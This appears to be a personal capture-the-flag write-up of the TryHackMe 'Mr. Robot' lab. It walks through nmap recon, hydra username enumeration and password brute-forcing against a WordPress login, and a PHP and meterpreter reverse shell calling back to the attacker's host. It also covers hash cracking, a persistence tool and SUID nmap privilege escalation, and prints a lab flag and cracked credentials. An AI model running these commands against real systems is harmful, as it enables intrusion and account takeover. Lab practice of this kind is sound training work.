# Mr. Robot

## Preparation

Added IP to /etc/hosts as "robot"

## Recon

Doing this one inside of MSF
```
sudo msfdb run
workspace -a tryhackme-mr-robot
workspace tryhackme-mr-robot 
db_nmap -v -p- -T4 robot
...
[*] Nmap: 22/tcp  closed ssh
[*] Nmap: 80/tcp  open   http
[*] Nmap: 443/tcp open   https
```

```
db_nmap -v -p 22,80,443 -sT -A robot
...
[*] Nmap: Aggressive OS guesses: HP P2000 G3 NAS device (93%), DD-WRT v24 or v30 (Linux 3.10) (90%), Linux 3.10 - 4.1
1 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 4.1 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%), Crestron XPanel
 control system (89%), Linux 3.10 (88%)
```

Looks like an embedded Linux device running a web server

```
 msf5 > hosts

Hosts
=====

address        mac  name   os_name   os_flavor  os_sp  purpose  info  comments
-------        ---  ----   -------   ---------  -----  -------  ----  --------
10.10.175.108       robot  embedded                    device         

msf5 > services 
Services
========

host           port  proto  name     state   info
----           ----  -----  ----     -----   ----
10.10.175.108  22    tcp    ssh      closed  
10.10.175.108  80    tcp    http     open    Apache httpd
10.10.175.108  443   tcp    ssl/ssl  open    Apache httpd SSL-only mode
```

Running gobuster
```
use auxiliary/scanner/http/dir_scanner
setg RHOSTS robot
set DICTIONARY /usr/share/seclists/Discovery/Web-Content/big.txt
```

Visiting the website manually and poking around.

http://robot/robots.txt
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

http://robot/key-1-of-3.txt
"073403c8a58a1f80d943455fb30724b9"

Downloading http://robot/fsocity.dic
```
wget http://robot/fsocity.dic
```

It is a dictionary with some duplicates, removing duplicates.
```
cat fsocity.dic | wc -l
858160
cat fsocity.dic | sort -u | wc -l
11451
sort -uo fsocity.dic fsocity.dic
cat fsocity.dic | wc -l
11451
```

MSF found an RSS feed file
```
[+] Found http://10.10.175.108:80/feed/ 200 (10.10.175.108)*
```

Which contains the following contents
```
<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
        xmlns:content="http://purl.org/rss/1.0/modules/content/"
        xmlns:wfw="http://wellformedweb.org/CommentAPI/"
        xmlns:dc="http://purl.org/dc/elements/1.1/"
        xmlns:atom="http://www.w3.org/2005/Atom"
        xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
        xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
        >

<channel>
        <title>user&#039;s Blog!</title>
        <atom:link href="http://robot/feed/" rel="self" type="application/rss+xml" />
        <link>http://robot</link>
        <description>Just another WordPress site</description>
        <lastBuildDate></lastBuildDate>
        <language>en-US</language>
        <sy:updatePeriod>hourly</sy:updatePeriod>
        <sy:updateFrequency>1</sy:updateFrequency>
        <generator>http://wordpress.org/?v=4.3.1</generator>
</channel>
</rss>
```

Wordpress 4.3.1

http://robot/wp-login/index.php

It tells you when the username is wrong, enumerating usernames with the dictionary that was provided
```
hydra -L ctp/fsocity.dic -p tmp robot http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid'
...
[80][http-post-form] host: robot   login: elliot   password: tmp
[80][http-post-form] host: robot   login: ELLIOT   password: tmp
[80][http-post-form] host: robot   login: Elliot   password: tmp*
```

elliot is a valid username (not case sensitive)

Bruteforcing password with the same dictionary
```
hydra -l elliot -P ctp/fsocity.dic robot http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect'
...
[80][http-post-form] host: robot   login: elliot   password: ER28-0652
```

wordpress:elliot:ER28-0652

Logged into wordpress site

"WordPress 4.3.1 running Twenty Fifteen theme."

We can upload documents at *http://robot/wp-admin/upload.php*, seeing if I can upload a web shell.
```
python3 shellclip.py --lhost 10.2.14.14 --lport 53 -c php
```

Cannot upload, tried phtml, php[3-5], .inc, .php.jpg, and .jpg.php

Tried exploiting a blog post with php injection, it doesn't work. We can edit the template for a 404 error! Puting in PHP reverse shell code.

Got a shell! Re-exploiting and using a meterpreter payload.

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.14.14 LPORT=53 -f raw -o rev.php
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
setg LHOST 10.2.14.14
set LPORT 53
exploit
```

Password hash in /home/robot

"robot:c3fcd3d76192e4007dfb496cca67e13b"

Used crackstation, the originating value is *abcdefghijklmnopqrstuvwxyz*

Configuring linper on 5253

robot can't sudo, looking for suid's

```
find / $(pwd) -perm /4000 2> /dev/null
...
/usr/local/bin/nmap
```
Nmap scripts use Lua and you can get a shell with Lua

This one does not have NSE but does have an interactive option

```
nmap --interactive
! /bin/bash -p
```